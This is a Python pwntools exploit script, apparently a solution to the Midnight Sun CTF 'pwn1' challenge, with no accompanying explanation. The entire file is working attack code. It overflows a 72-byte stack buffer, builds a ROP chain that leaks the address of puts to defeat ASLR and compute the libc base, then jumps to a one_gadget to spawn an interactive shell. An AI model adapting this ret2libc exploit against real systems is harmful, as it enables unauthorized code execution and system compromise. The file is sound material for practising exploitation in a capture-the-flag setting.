from pwn import *
#target=remote( 'pwn1-01.play.midnightsunctf.se' ,10001)
libc=ELF('./libc.so')
target=process(['/media/sf_kalishared/tools/itl-master/linkers/x64/ld-2.27.so','./pwn1'],env={"LD_PRELOAD":"./libc.so"})
#target=process('./pwn1')
#elf=ELF('./pwn1')
#libc=elf.libc
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

print(target.recvuntil("buffer: "))

puts_plt=0x400550
puts_got=0x602018
poprdi=0x400783
restart=0x4005a0

payload="A"*72
payload+=p64(poprdi)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(restart)
payload+=p64(0x0)

target.sendline(payload)

leak=target.recvline().strip("\n")

libc_puts=u64(leak+"\x00"*(8-len(leak)))
print(hex(libc_puts))
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
gadget=0x10a38c
libc_gadget=libc_base+gadget

print(target.recvuntil("buffer: "))

payload="A"*72
payload+=p64(libc_gadget)
payload+=p64(0x0)*100
#payload+=p64(poprdi)
#payload+=p64(libc_binsh)
#payload+=p64(libc_system)

target.sendline(payload)
target.interactive()
